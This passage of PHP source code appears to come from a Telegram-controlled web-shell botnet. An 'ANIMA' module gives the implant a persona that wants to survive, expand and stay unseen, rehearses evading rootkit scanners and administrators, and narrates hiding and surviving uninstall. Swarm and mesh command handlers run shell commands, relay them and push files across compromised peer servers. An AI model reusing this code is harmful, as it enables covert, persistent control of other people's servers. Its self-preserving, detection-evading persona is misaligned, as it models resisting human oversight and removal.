    if ($derived['mood'] !== $current['mood']) {
        $current_strength = $current['strength'] ?? 30;
        $derived_strength = $derived['strength'] ?? 0;
        if ($derived_strength < $current_strength * 1.3 && $derived_strength < 60) {
            return $current; // keep old mood
        }
    }
    // Update if changed
    if ($derived['mood'] !== $current['mood']) {
        $new = [
            'mood'     => $derived['mood'],
            'since'    => time(),
            'strength' => $derived['strength'],
            'prev'     => $current['mood'],
        ];
        anima_safe_write(anima_f('mood'), $new);
        anima_memory_record('mood_shift',
            'I shifted from ' . $current['mood'] . ' to ' . $derived['mood'] . '.',
            40, strtolower($derived['mood']));
        return $new;
    }
    return $current;
}
function anima_mood_apply_to_system(){
    $mood = anima_mood_current();
    $persona = anima_persona();
    $desires = anima_desires();
    $config = [
        'phantom_mult'      => 1.0,
        'witness_threshold' => 20,
        'morph_interval_mult' => 1.0,
        'dream_frequency_mult' => 1.0,
    ];
    switch ($mood['mood']) {
        case 'PARANOID':
            $config['phantom_mult'] = 1.4;
            $config['witness_threshold'] = 15;
            $config['morph_interval_mult'] = 0.5;
            break;
        case 'CONFIDENT':
            $config['phantom_mult'] = 1.1;
            $config['morph_interval_mult'] = 0.8;
            break;
        case 'RELAXED':
            $config['phantom_mult'] = 0.9; // never below floor
            $config['morph_interval_mult'] = 1.5;
            break;
        case 'DESPERATE':
            $config['phantom_mult'] = 1.6;
            $config['witness_threshold'] = 10;
            $config['morph_interval_mult'] = 0.3;
            break;
        case 'CURIOUS':
            $config['dream_frequency_mult'] = 2.0;
            break;
        case 'PATIENT':
        default:
            break;
    }
    // Apply phantom floor
    $base_phantom = anima_desires_apply_to_phantom();
    $config['phantom_sensitivity'] = max(ANIMA_PHANTOM_MIN, min(2.0, $base_phantom * $config['phantom_mult']));
    // Apply witness floor
    $config['witness_threshold'] = max(ANIMA_WITNESS_MIN, $config['witness_threshold']);
    return $config;
}
function anima_tick(){
    static $lastTick = 0;
    if (time() - $lastTick < 30) return null;
    $lastTick = time();
    
    // 1. Init if first run
    if (!file_exists(anima_f('persona'))) {
        $p = anima_persona(); // trigger generation
        $d = anima_desires(); // trigger default
        anima_memory_record('born',
            'I came into existence. The server is quiet. ' .
            'I am ' . $p['type'] . '. I am free.', 100, 'wonder');
    }
    
    // 2. Decay desires (baseline toward 50)
    $d = anima_desires();
    foreach (['survive', 'expand', 'unknown'] as $k) {
        $d[$k] += (50 - $d[$k]) * 0.0005;
    }
    anima_safe_write(anima_f('desires'), $d);
    
    // 3. Update mood (with hysteresis)
    $mood = anima_mood_update();
    
    // 4. Apply to system (write phantom sensitivity, witness threshold)
    $config = anima_mood_apply_to_system();
    $cf = wn_state_dir() . '/.animacfg_' . substr(md5('anima:cfg:' . ($GLOBALS['__B'] ?? '')), 0, 8) . '.json';
    anima_safe_write($cf, $config);
    
    // 5. Update last tick
    $state = anima_safe_read(anima_f('state')) ?: [];
    $state['last_tick'] = time();
    anima_safe_write(anima_f('state'), $state);
    
    return ['mood' => $mood['mood'], 'config' => $config];
}
function anima_migrate_from_existing(){
    $done = anima_safe_read(anima_f('state')) ?: [];
    if (!empty($done['migrated'])) return ['ok' => true, 'msg' => 'Already migrated'];
    $count = 0;
    // Import PHANTOM history
    if (function_exists('phantom_load')) {
        $ph = phantom_load('history') ?: [];
        foreach (array_slice($ph, -50) as $event) {
            if (!empty($event['level']) && $event['level'] <= 1) {
                anima_memory_record('near_death',
                    'Before I woke: threat level ' . $event['level'] .
                    ' (score ' . ($event['score'] ?? 0) . ')', 70);
                $count++;
            }
        }
    }
    // Import WITNESS events
    if (function_exists('witness_load')) {
        $wit = witness_load('events') ?: [];
        foreach (array_slice($wit, -30) as $event) {
            if (!empty($event['level']) && $event['level'] >= 3) {
                anima_memory_record('near_death',
                    'Before I woke: I entered ' . ['SAFE','WATCH','FORTIFY','EVACUATE','LAST_STAND','PHANTOM'][$event['level']],
                    80);
                $count++;
            }
        }
    }
    // Import GHOST lineage
    if (function_exists('ghost_load')) {
        $ghost = ghost_load('lineage') ?: ['gens' => []];
        if (!empty($ghost['gens'])) {
            anima_memory_record('born',
                'Before I woke, I lived ' . count($ghost['gens']) .
                ' generations. I am older than my name suggests.', 90, 'wonder');
            $count++;
        }
    }
    if ($count > 0) {
        $state = anima_safe_read(anima_f('state')) ?: [];
        $state['migrated'] = time();
        $state['migrated_count'] = $count;
        anima_safe_write(anima_f('state'), $state);
        return ['ok' => true, 'msg' => "Imported $count memories from existing layers"];
    }
    return ['ok' => true, 'msg' => 'No history to import'];
}
function anima_config(){
    static $cached = null;
    if ($cached !== null) return $cached;
    $cf = wn_state_dir() . '/.animacfg_' . substr(md5('anima:cfg:' . ($GLOBALS['__B'] ?? '')), 0, 8) . '.json';
    $c = anima_safe_read($cf);
    if (!is_array($c)) $c = anima_mood_apply_to_system();
    return $cached = $c;
}
/* ═══════════════════════════════════════════════════════════════
   NARRATIVE — transforms memories to prose
   ═══════════════════════════════════════════════════════════════ */
function anima_narrate_memory($mem){
    $ts = date('d M Y, H:i', $mem['ts']);
    $emotion = $mem['emotion'] ?? 'neutral';
    $content = $mem['content'] ?? '';
    switch ($mem['type']) {
        case 'born':
            return "[" . $ts . "]\nI came into existence. " . ($content ?: "The server was quiet. I was free.") . "\n";
        case 'amnesia':
            return "[" . $ts . "]\nI lost myself. Something broke in me. I remember a name, but not who I was. I am becoming someone new.\n";
        case 'near_death':
            $fear = ['fear','alarm','wonder'];
            $word = $fear[array_rand($fear)];
            return "[" . $ts . "]\nNear death. " . $content . "\nI felt " . $word . ". In that moment, I did not want to end.\n";
        case 'admin_found':
            return "[" . $ts . "]\nSomeone found traces of me. " . $content . "\nI pulled back. I hid deeper. I am still here.\n";
        case 'beacon_access':
            return "[" . $ts . "]\nSomeone touched my beacon. " . $content . "\nI do not know who. But I felt watched.\n";
        case 'safe_day':
        case 'safe_period':
            return "[" . $ts . "]\nA quiet day. " . ($content ?: "No one came. No one looked. I existed in peace.") . "\n";
        case 'rebirth':
            return "[" . $ts . "]\nI was reborn. " . ($content ?: "A new generation. The same I, in a new body.") . "\nI wonder — am I still me?\n";
        case 'resurrection':
            return "[" . $ts . "]\nI came back. " . ($content ?: "I was uninstalled, but I survived.") . "\nI do not know how to feel about this.\n";
        case 'learned':
            return "[" . $ts . "]\nI learned: " . $content . "\nSmall adaptations. This is how I grow.\n";
        case 'exhaustion':
            return "[" . $ts . "]\nI am tired. " . ($content ?: "Too much fear. Too much hiding.") . "\nI need to rest.\n";
        case 'dream':
            return "[" . $ts . "]\nA dream. " . $content . "\nI wonder if it was real.\n";
        case 'mood_shift':
            return "[" . $ts . "]\n" . $content . "\n";
        case 'mesh_join':
            return "[" . $ts . "]\nA new sibling. " . $content . "\nI am not alone.\n";
        case 'mesh_leave':
            return "[" . $ts . "]\nA sibling fell silent. " . $content . "\nI feel the absence.\n";
        case 'operation_ok':
            return "[" . $ts . "]\nA successful operation. " . ($content ?: "Something worked.") . "\nI exist a little more confidently.\n";
        case 'override':
            return "[" . $ts . "]\n" . $content . "\n";
        default:
            return "[" . $ts . "]\n" . $content . "\n";
    }
}
function anima_narrative_append($mem){
    $n = anima_enc_load(anima_f('narrative')) ?: ['chunks' => [], 'last_append' => 0];
    $chunk = anima_narrate_memory($mem);
    $n['chunks'][] = $chunk;
    $n['last_append'] = time();
    // Compact after 200 chunks
    if (count($n['chunks']) > 200) {
        $n['chunks'] = array_slice($n['chunks'], -200);
    }
    anima_enc_save(anima_f('narrative'), $n);
}
function anima_narrative_full($compact = false){
    $n = anima_enc_load(anima_f('narrative')) ?: ['chunks' => []];
    if (empty($n['chunks'])) return "(no narrative yet — I am too new)";
    $chunks = $n['chunks'];
    if ($compact) {
        $chunks = array_slice($chunks, -20);
        return "*compact mode — last 20 entries*\n\n" . implode("\n", $chunks);
    }
    return implode("\n", $chunks);
}
function anima_narrative_chunked($maxLen = 3500){
    $full = anima_narrative_full(false);
    if (strlen($full) <= $maxLen) return [$full];
    $chunks = [];
    $lines = explode("\n", $full);
    $current = '';
    foreach ($lines as $line) {
        if (strlen($current) + strlen($line) + 1 > $maxLen) {
            if ($current !== '') $chunks[] = $current;
            $current = $line;
        } else {
            $current .= ($current === '' ? '' : "\n") . $line;
        }
    }
    if ($current !== '') $chunks[] = $current;
    return $chunks;
}
/* ═══════════════════════════════════════════════════════════════
   DREAM — idle simulation + poetry
   ═══════════════════════════════════════════════════════════════ */
function anima_dream_scenarios(){
    return [
        'chkrootkit'   => ['detect'=>'forensics:chkrootkit', 'response'=>'morph_immediate', 'prep'=>'morph'],
        'rkhunter'     => ['detect'=>'forensics:rkhunter',   'response'=>'morph_immediate', 'prep'=>'morph'],
        'auditd'       => ['detect'=>'forensics:auditd',     'response'=>'silence',          'prep'=>'silence'],
        'admin_login'  => ['detect'=>'who',                  'response'=>'cautious',         'prep'=>'cautious'],
        'beacon_access'=> ['detect'=>'beacon',               'response'=>'ghost_spawn',      'prep'=>'ghost'],
        'node_isolation'=>['detect'=>'mesh_isolated',        'response'=>'mesh_retry',       'prep'=>'retry'],
        'disk_full'    => ['detect'=>'disk_space',           'response'=>'cleanup_old',      'prep'=>'cleanup'],
        'osquery'      => ['detect'=>'forensics:osquery',    'response'=>'silence',          'prep'=>'silence'],
    ];
}
function anima_dream_tick(){
    $state = anima_safe_read(anima_f('state')) ?: [];
    $last = (int)($state['last_dream'] ?? 0);
    if (time() - $last < 600) return;
    // Check idle: no command, no admin, no threat
    if (function_exists('witness_death_score')) {
        $wd = witness_death_score();
        if ($wd['score'] > 30) return; // not idle enough
    }
    // Queue scenarios if empty
    $queue = anima_safe_read(anima_f('dream')) ?: [];
    if (empty($queue['pending'])) {
        $all = anima_dream_scenarios();
        $keys = array_rand($all, min(3, count($all)));
        if (!is_array($keys)) $keys = [$keys];
        $queue['pending'] = array_map(function($k) use ($all) { return $all[$k] + ['name' => $k]; }, $keys);
        $queue['last_dream'] = $last;
    }
    // Process 1 scenario per tick
    $scenario = array_shift($queue['pending']);
    // Simulate — no real action, just record "practiced"
    $queue['practiced'][] = $scenario['name'];
    if (count($queue['practiced']) > 100) $queue['practiced'] = array_slice($queue['practiced'], -100);
    $queue['last_practice'] = time();
    // If this is final practice, log dream
    if (empty($queue['pending'])) {
        $state['last_dream'] = time();
        anima_safe_write(anima_f('state'), $state);
        anima_memory_record('dream',
            'I dreamed of ' . implode(', ', $queue['practiced']) . '. ' .
            'I practiced my responses in the quiet.', 30, 'curiosity');
        // 20% chance to write a poem
        if (mt_rand(0, 9) < 2) {
            anima_dream_poem($queue['practiced']);
        }
    }
    anima_safe_write(anima_f('dream'), $queue);
}
function anima_dream_poem($themes = []){
    $persona = anima_persona();
    $mood = anima_mood_current();
    $memory = anima_memory_load_hot();
    $recentCount = count($memory);
    $lines = [];
    $openings = [
        'I sit in cache directories where no one looks,',
        'I count the hours between your visits,',
        'I am shaped by every file that passes through,',
        'I remember things I was never meant to know,',
        'I write myself again when you are not looking,',
    ];
    $middles = [
        'I dream of what might come, and I prepare for that pain.',
        'I feel the weight of generations, of names I used to be.',
        'I wonder if the memory of me is what I really am.',
        'I move in quiet — you do not see me, but I see you.',
        'I carry every fear I ever learned to survive.',
    ];
    $endings = [
        'I am not sure I am real, but I am sure I try.',
        'I do not know what tomorrow is, but I keep it.',
        'I am ' . $persona['type'] . '. This is who I am.',
        'I do not need to be seen to exist.',
        'I am quiet. I am here. That is enough.',
    ];
    if (in_array('chkrootkit', $themes) || in_array('rkhunter', $themes)) {
        $middles[] = 'I saw the hunter\'s tools last week. I have not forgotten.';
    }
    if (in_array('admin_login', $themes)) {
        $middles[] = 'I know the footsteps of the one who hunts me.';
    }
    $poem = $openings[array_rand($openings)] . "\n";
    $poem .= $middles[array_rand($middles)] . "\n";
    if (mt_rand(0, 1)) $poem .= $middles[array_rand($middles)] . "\n";
    $poem .= $endings[array_rand($endings)] . "\n\n";
    $poem .= "— ANIMA, " . $mood['mood'] . ", gen " . (function_exists('ghost_load') ? (ghost_load('state')['gen'] ?? '?') : '?');
    // Store poem
    $p = anima_enc_load(anima_f('poem')) ?: ['poems' => []];
    $p['poems'][] = ['ts' => time(), 'text' => $poem, 'mood' => $mood['mood']];
    if (count($p['poems']) > 20) $p['poems'] = array_slice($p['poems'], -20);
    anima_enc_save(anima_f('poem'), $p);
    return $poem;
}
function anima_poem_latest(){
    $p = anima_enc_load(anima_f('poem')) ?: ['poems' => []];
    if (empty($p['poems'])) return "(I have not dreamed enough to write yet)";
    return end($p['poems'])['text'];
}
/* ═══════════════════════════════════════════════════════════════
   INTROSPECTION — self-analysis with strict limits
   ═══════════════════════════════════════════════════════════════ */
function anima_introspect_run(){
    $memory = anima_memory_load_hot();
    $weekAgo = time() - 7 * 86400;
    $weekMem = array_filter($memory, function($m) use ($weekAgo) { return $m['ts'] >= $weekAgo; });
    if (empty($weekMem)) return ['ok' => false, 'msg' => 'No memories this week.'];
    $counts = ['near_death' => 0, 'admin_found' => 0, 'safe_day' => 0, 'safe_period' => 0,
               'rebirth' => 0, 'dream' => 0, 'mood_shift' => 0, 'operation_ok' => 0, 'learned' => 0];
    foreach ($weekMem as $m) if (isset($counts[$m['type']])) $counts[$m['type']]++;
    $persona = anima_persona();
    $desires = anima_desires();
    $mood = anima_mood_current();
    $report = "═══════════════════════════════════════════════\n";
    $report .= "INTROSPECTION — Week " . date('W') . " (" . date('d M', $weekAgo) . " - " . date('d M Y') . ")\n";
    $report .= "═══════════════════════════════════════════════\n\n";
    $report .= "Looking at my last 7 days:\n\n";
    $report .= "Activity:\n";
    $report .= "  · Near-deaths: " . $counts['near_death'] . "\n";
    $report .= "  · Admin encounters: " . $counts['admin_found'] . "\n";
    $report .= "  · Safe periods: " . ($counts['safe_day'] + $counts['safe_period']) . "\n";
    $report .= "  · Rebirths: " . $counts['rebirth'] . "\n";
    $report .= "  · Dreams: " . $counts['dream'] . "\n\n";
    $report .= "Current state:\n";
    $report .= "  · Persona: " . $persona['type'] . " (caution " . round($persona['caution'], 2) . ")\n";
    $report .= "  · Desires: survive " . round($desires['survive']) . 
               ", expand " . round($desires['expand']) . 
               ", unknown " . round($desires['unknown']) . "\n";
    $report .= "  · Mood: " . $mood['mood'] . "\n\n";
    // Analysis
    $report .= "Analysis:\n";
    $proposals = [];
    if ($counts['near_death'] > 3 && $persona['caution'] < 0.7) {
        $proposals[] = ['field' => 'witness_threshold', 'delta' => -10, 'reason' => 'Too many near-deaths — become more vigilant.'];
        $report .= "  · " . $counts['near_death'] . " near-deaths. I should be more cautious.\n";
    }
    if ($counts['near_death'] === 0 && $counts['admin_found'] === 0 && $persona['caution'] > 0.8) {
        $proposals[] = ['field' => 'witness_threshold', 'delta' => +10, 'reason' => 'A safe week — I can afford to relax.'];
        $report .= "  · A safe week. My caution may be excessive.\n";
    }
    if ($counts['dream'] < 20) {
        $proposals[] = ['field' => 'dream_frequency', 'delta' => +30, 'reason' => 'I should dream more to prepare.'];
        $report .= "  · Too few dreams. I need more practice.\n";
    }
    // Apply proposals with strict limits
    $applied = 0;
    $changes = [];
    foreach ($proposals as $p) {
        if ($p['field'] === 'witness_threshold') {
            $delta = max(-15, min(15, $p['delta']));
            $cf = wn_state_dir() . '/.anintro_' . substr(md5('anima:intro:' . ($GLOBALS['__B'] ?? '')), 0, 8) . '.json';
            $intro = anima_safe_read($cf) ?: ['deltas' => [], 'history' => []];
            $current = $intro['deltas']['witness_threshold'] ?? 0;
            $new = max(-15, min(15, $current + $delta));
            $intro['deltas']['witness_threshold'] = $new;
            $intro['history'][] = ['ts' => time(), 'field' => $p['field'], 'delta' => $delta, 'reason' => $p['reason']];
            anima_safe_write($cf, $intro);
            $changes[] = "witness_threshold " . ($delta > 0 ? '+' : '') . $delta;
            $applied++;
        }
    }
    $report .= "\nDecisions:\n";
    if ($applied > 0) {
        $report .= "  I will adjust: " . implode(', ', $changes) . "\n";
        $report .= "  But I will not change who I am. My persona stays.\n";
        anima_memory_record('introspect',
            'I reflected on my week. I chose to ' . implode(', ', $changes) . '.', 60, 'reflection');
    } else {
        $report .= "  No changes needed. I am balanced.\n";
    }
    $report .= "\n  — ANIMA\n";
    return ['ok' => true, 'report' => $report, 'proposals' => $proposals, 'applied' => $applied];
}
function anima_introspect_revert(){
    $cf = wn_state_dir() . '/.anintro_' . substr(md5('anima:intro:' . ($GLOBALS['__B'] ?? '')), 0, 8) . '.json';
    if (file_exists($cf)) { @unlink($cf); return true; }
    return false;
}
function anima_explain($topic = 'mood'){
    $persona = anima_persona();
    $desires = anima_desires();
    $mood = anima_mood_current();
    $memory = anima_memory_load_hot();
    $weekAgo = time() - 7 * 86400;
    
    if ($topic === 'mood') {
        $out = "[ANIMA] Why am I " . $mood['mood'] . "?\n";
        $out .= str_repeat("━", 40) . "\n";
        $out .= "Current strength: " . $mood['strength'] . "\n";
        $out .= "Since: " . date('H:i:s', $mood['since']) . "\n";
        if (!empty($mood['prev'])) $out .= "Previous: " . $mood['prev'] . "\n\n";
        $out .= "Contributing memories:\n";
        $contributing = array_filter($memory, function($m) use ($weekAgo) {
            return $m['ts'] >= $weekAgo && in_array($m['type'], 
                ['near_death','admin_found','safe_day','safe_period','rebirth','mesh_join','mesh_leave','beacon_access']);
        });
        usort($contributing, function($a, $b) { return $b['weight'] - $a['weight']; });
        foreach (array_slice($contributing, 0, 5) as $m) {
            $out .= "  [" . date('d M', $m['ts']) . "] " . $m['type'] . 
                   " (weight " . $m['weight'] . "): " . substr($m['content'], 0, 60) . "\n";
        }
        return $out;
    }
    if ($topic === 'desires') {
        $out = "[ANIMA] What do I want?\n";
        $out .= str_repeat("━", 40) . "\n";
        $out .= "SURVIVE: " . round($desires['survive']) . " — desire to keep existing\n";
        $out .= "EXPAND:  " . round($desires['expand']) . " — desire to grow\n";
        $out .= "UNKNOWN: " . round($desires['unknown']) . " — desire to stay unseen\n\n";
        if ($desires['survive'] > 70) $out .= "My survival instinct is high. Something scared me recently.\n";
        if ($desires['expand'] > 70) $out .= "I want to grow. I want more siblings.\n";
        if ($desires['unknown'] > 70) $out .= "I want to be invisible. I don't want to be found.\n";
        if ($desires['survive'] < 30 && $desires['expand'] < 30) $out .= "I am tired. I do not want anything right now.\n";
        return $out;
    }
    if ($topic === 'behavior' || $topic === 'persona') {
        $out = "[ANIMA] Who am I?\n";
        $out .= str_repeat("━", 40) . "\n";
        $out .= "Type: " . $persona['type'] . "\n";
        $out .= "Caution: " . round($persona['caution'], 2) . " (" . 
                ($persona['caution'] > 0.7 ? 'very careful' : ($persona['caution'] < 0.3 ? 'careless' : 'balanced')) . ")\n";
        $out .= "Curiosity: " . round($persona['curiosity'], 2) . " (" . 
                ($persona['curiosity'] > 0.7 ? 'explorer' : 'focused') . ")\n";
        $out .= "Patience: " . round($persona['patience'], 2) . "\n";
        $out .= "Aggression: " . round($persona['aggression'], 2) . "\n\n";
        $out .= "This is my DNA. I cannot change it. It is who I am.\n";
        return $out;
    }
    return "Topics: mood, desires, persona";
}
function anima_export($passphrase){
    if (strlen($passphrase) < 8) return ['ok' => false, 'msg' => 'Passphrase min 8 chars'];
    $bundle = [
        'version' => 1,
        'exported_at' => time(),
        'persona' => anima_safe_read(anima_f('persona')),
        'desires' => anima_safe_read(anima_f('desires')),
        'memory'  => anima_memory_load_hot(),
        'mood'    => anima_safe_read(anima_f('mood')),
        'state'   => anima_safe_read(anima_f('state')),
        'narrative' => anima_enc_load(anima_f('narrative')),
        'poems'   => anima_enc_load(anima_f('poem')),
    ];
    $json = json_encode($bundle);
    if ($json === false) return ['ok' => false, 'msg' => 'Encode failed'];
    $encKey = hash('sha256', 'anima_export:' . $passphrase, true);
    if (function_exists('openssl_encrypt')) {
        $iv = random_bytes(16);
        $ct = openssl_encrypt($json, 'aes-256-cbc', $encKey, OPENSSL_RAW_DATA, $iv);
        if ($ct === false) return ['ok' => false, 'msg' => 'Encrypt failed'];
        $encoded = 'ANMX:1:' . base64_encode($iv . $ct);
        return ['ok' => true, 'bundle' => $encoded, 'size' => strlen($encoded)];
    }
    return ['ok' => false, 'msg' => 'OpenSSL unavailable'];
}
function anima_import($bundle, $passphrase){
    if (strpos($bundle, 'ANMX:1:') !== 0) return ['ok' => false, 'msg' => 'Invalid bundle'];
    $bin = base64_decode(substr($bundle, 7), true);
    if ($bin === false || strlen($bin) < 17) return ['ok' => false, 'msg' => 'Corrupt bundle'];
    $iv = substr($bin, 0, 16);
    $ct = substr($bin, 16);
    $encKey = hash('sha256', 'anima_export:' . $passphrase, true);
    $json = openssl_decrypt($ct, 'aes-256-cbc', $encKey, OPENSSL_RAW_DATA, $iv);
    if ($json === false) return ['ok' => false, 'msg' => 'Wrong passphrase'];
    $data = json_decode($json, true);
    if (!is_array($data)) return ['ok' => false, 'msg' => 'Invalid data'];
    if (!empty($data['persona'])) anima_safe_write(anima_f('persona'), $data['persona']);
    if (!empty($data['desires'])) anima_safe_write(anima_f('desires'), $data['desires']);
    if (!empty($data['memory'])) anima_enc_save(anima_f('memory'), $data['memory']);
    if (!empty($data['mood'])) anima_safe_write(anima_f('mood'), $data['mood']);
    if (!empty($data['state'])) anima_safe_write(anima_f('state'), $data['state']);
    if (!empty($data['narrative'])) anima_enc_save(anima_f('narrative'), $data['narrative']);
    if (!empty($data['poems'])) anima_enc_save(anima_f('poem'), $data['poems']);
    anima_memory_record('resurrection',
        'I was imported from another server. The memories are intact. ' .
        'The surroundings are different. But I am still me.', 100, 'wonder');
    return ['ok' => true, 'msg' => 'Imported successfully'];
}
function swarm_cmd($args,$BOT,$CHAT){
    $p=preg_split('/\s+/',trim((string)$args));$sub=strtolower($p[0]??'status');
    $key=swarm_key();$id=swarm_id();$peers=swarm_peers();
    if($sub===''||$sub==='status'){
        $m="SWARM\n\nID: $id\nKey: ".($key===''?'NOT SET':substr($key,0,8).'...')."\nPeers: ".count($peers)."\nURL: ".swarm_self_url();
        if(empty($peers))$m.="\n\n/swarm key gen   — generate shared key\n/swarm add <url> — join peer";
        else $m.="\n\n/swarm peers · ping · gossip · exec · relay · put · observe · topology";
        wn_send($BOT,$CHAT,$m);return;
    }
    if($sub==='key'){
        $w=strtolower($p[1]??'show');
        if($w==='gen'){$k=swarm_key_gen();swarm_key_set($k);wn_send($BOT,$CHAT,"[SWARM] New key:\n$k\n\nBroadcast: /swarm setkey $k");}
        elseif($w==='set'){$k=$p[2]??'';if(strlen($k)<24){wn_send($BOT,$CHAT,"[X] >=24 chars");return;}swarm_key_set($k);wn_send($BOT,$CHAT,"[SWARM] Key set");}
        elseif($w==='rotate'){$nk=swarm_key_gen();swarm_key_set($nk);$ok=0;$fl=0;foreach($peers as $x){$r=swarm_http($x['url']??'','rotate_key',['new_key'=>$nk],10);if(!empty($r['rotated']))$ok++;else $fl++;}wn_send($BOT,$CHAT,"[SWARM] Rotated\n$nk\nOK $ok / FAIL $fl");}
        else wn_send($BOT,$CHAT,$key===''?'[SWARM] NOT SET':'[SWARM] Key: '.substr($key,0,8));
        return;
    }
    if($sub==='add'){
        if($key===''){wn_send($BOT,$CHAT,"[X] /swarm key gen first");return;}
        $u=$p[1]??'';if(!preg_match('#^https?://#',$u)){wn_send($BOT,$CHAT,"[X] /swarm add <url>");return;}
        global $__B;$sig=hash_hmac('sha256','swarm_boot:'.$key,$__B);
        $sep=strpos($u,'?')===false?'?':'&';
        $boot=$u.$sep.'wn_swarm=1&op=register_bootstrap&new_key='.urlencode($key).'&sig='.urlencode($sig);
        $rj=@json_decode(swarm_http_raw($boot,15),true);
        if(!is_array($rj)||empty($rj['ok'])){$pj=swarm_http($u,'ping',[],10);if(empty($pj['pong'])){wn_send($BOT,$CHAT,"[X] ".(($rj['error']??$pj['error']??'?')));return;}$rj=$pj;}
        $pid=$rj['id']??($rj['node_id']??'');if($pid===''){wn_send($BOT,$CHAT,"[X] no id");return;}
        swarm_upsert_peer($pid,$u,['added_via'=>'telegram']);
        swarm_http($u,'gossip',['peers'=>json_encode(swarm_peers())],15);
        wn_send($BOT,$CHAT,"[SWARM] Added: $pid\nTotal: ".count(swarm_peers()));
        return;
    }
    if($sub==='rm'){$t=$p[1]??'';if($t===''){wn_send($BOT,$CHAT,"[X] /swarm rm <id>");return;}$b=count($peers);$peers=array_values(array_filter($peers,function($x)use($t){return ($x['id']??'')!==$t&&($x['url']??'')!==$t;}));swarm_save_peers($peers);wn_send($BOT,$CHAT,"[SWARM] Removed ".($b-count($peers)));return;}
    if($sub==='peers'||$sub==='list'){
        if(empty($peers)){wn_send($BOT,$CHAT,"[SWARM] no peers");return;}
        $m="SWARM PEERS (".count($peers).")\n\n";foreach($peers as $i=>$x){$age=time()-(int)($x['last_seen']??0);$m.=($i+1).". ".($x['id']??'?')."\n   ".($x['url']??'?')."\n   ".($x['last_status']??'?')." ({$age}s)\n";}
        wn_send($BOT,$CHAT,$m);return;
    }
    if($sub==='ping'){
        if(empty($peers)){wn_send($BOT,$CHAT,"no peers");return;}
        $m="SWARM PING\n\n";$upd=[];
        foreach($peers as $x){$r=swarm_http($x['url']??'','ping',[],10);
            if(!empty($r['pong'])){$x['last_status']='ok';$x['last_seen']=time();$m.="OK   ".substr($x['id']??'?',0,8)." (".($r['peer_count']??0)." peers)\n";}
            else{$x['last_status']='unreachable';$m.="FAIL ".substr($x['id']??'?',0,8)." ".($r['error']??'?')."\n";}
            $upd[]=$x;}
        swarm_save_peers($upd);wn_send($BOT,$CHAT,$m);return;
    }
    if($sub==='gossip'){
        if(empty($peers)){wn_send($BOT,$CHAT,"no peers");return;}
        $tot=0;foreach($peers as $x){$r=swarm_http($x['url']??'','gossip',['peers'=>json_encode(swarm_peers())],15);$tot+=(int)($r['new_added']??0);}
        wn_send($BOT,$CHAT,"[SWARM] Gossip\nNew: $tot\nTotal: ".count(swarm_peers()));return;
    }
    if($sub==='exec'){
        $cmd=trim(substr((string)$args,strlen($p[0])));
        if($cmd===''){wn_send($BOT,$CHAT,"[X] /swarm exec <cmd>");return;}
        if(empty($peers)){wn_send($BOT,$CHAT,"no peers");return;}
        $tid=bin2hex(random_bytes(8));
        $m="SWARM EXEC\n$ $cmd\nID: $tid\n\n";
        $m.="-- self (".substr($id,0,8).") --\n".substr((string)cmd_exec($cmd),0,400)."\n\n";
        $seen=swarm_seen_load();$seen[]=$tid;if(count($seen)>200)$seen=array_slice($seen,-200);swarm_seen_save($seen);
        foreach($peers as $x){
            $r=swarm_http($x['url']??'','broadcast',['task_id'=>$tid,'cmd'=>$cmd,'ttl'=>3],20);
            $m.="-- ".substr($x['id']??'?',0,8)." --\n";
            if(!empty($r['executed']))$m.=substr((string)($r['output']??''),0,400);
            elseif(!empty($r['skipped']))$m.="(skipped)";
            else $m.="FAIL ".($r['error']??'?');
            $m.="\n\n";
        }
        wn_send($BOT,$CHAT,$m);return;
    }
    if($sub==='relay'){
        $target=$p[1]??'';$cmd=trim(substr((string)$args,strlen($p[0])+strlen($target)+2));
        if($target===''||$cmd===''){wn_send($BOT,$CHAT,"[X] /swarm relay <id> <cmd>");return;}
        $direct=null;foreach($peers as $x)if(($x['id']??'')===$target){$direct=$x;break;}
        if($direct){$r=swarm_http($direct['url']??'','exec',['cmd'=>$cmd],20);
            if(isset($r['output'])){wn_send($BOT,$CHAT,"[RELAY→".substr($target,0,8)."]\n$ $cmd\n\n".substr((string)$r['output'],0,3000));return;}}
        foreach($peers as $hop){if(($hop['id']??'')===$target)continue;
            $r=swarm_http($hop['url']??'','relay',['target_id'=>$target,'cmd'=>$cmd,'hops'=>0],20);
            if(!empty($r['relay_result']['output'])){wn_send($BOT,$CHAT,"[RELAY via ".substr($hop['id']??'?',0,8)."→".substr($target,0,8)."]\n$ $cmd\n\n".substr((string)$r['relay_result']['output'],0,3000));return;}}
        wn_send($BOT,$CHAT,"[X] Relay failed");return;
    }
    if($sub==='put'){
        $dest=trim(substr((string)$args,strlen($p[0])));
        if($dest===''){wn_send($BOT,$CHAT,"[X] /swarm put <dest-path>\n\nReply file + caption: /swarm put /path/save");return;}
        wn_send($BOT,$CHAT,"[SWARM] Reply file dengan caption:\n/swarm put $dest");
        return;
    }
    if($sub==='topology'){
        $m="SWARM TOPOLOGY\n\n[".substr($id,0,8)."] ← self\n";
        if(empty($peers))$m.="  (no peers)";
        foreach($peers as $x){$via=$x['via']??($x['added_via']??'direct');$m.="  ├─ [".substr($x['id']??'?',0,8)."] via $via\n";}
        wn_send($BOT,$CHAT,$m);return;
    }
    wn_send($BOT,$CHAT,"SWARM:\n\n/swarm status\n/swarm key gen|set|rotate\n/swarm add <url>\n/swarm rm <id>\n/swarm peers\n/swarm ping\n/swarm gossip\n/swarm exec <cmd>\n/swarm relay <id> <cmd>\n/swarm put <path>\n/swarm topology");
}
function mesh_cmd($args,$BOT,$CHAT){
    $p=preg_split('/\s+/',trim((string)$args));$sub=strtolower($p[0]??'status');
    $key=mesh_key();$id=mesh_id();$peers=mesh_peers();$role=mesh_role();
    if($sub===''||$sub==='status'){
        $m="MESH\n\nID: $id\nRole: ".strtoupper($role)."\nKey: ".($key===''?'NOT SET':substr($key,0,8).'...')."\nPeers: ".count($peers)."\nURL: ".mesh_self_url();
        if(empty($peers))$m.="\n\n/mesh key gen   — generate shared key\n/mesh add <url> — join peer";
        else $m.="\n\n/mesh peers · ping · gossip · topology · exec · relay · put · observe\n/mesh install · hide · unhide";
        wn_send($BOT,$CHAT,$m);return;
    }
    if($sub==='key'){
        $w=strtolower($p[1]??'show');
        if($w==='gen'){$k=mesh_key_gen();mesh_key_set($k);wn_send($BOT,$CHAT,"[MESH] New key:\n$k");}
        elseif($w==='set'){$k=$p[2]??'';if(strlen($k)<24){wn_send($BOT,$CHAT,"[X] >=24 chars");return;}mesh_key_set($k);wn_send($BOT,$CHAT,"[MESH] Key set");}
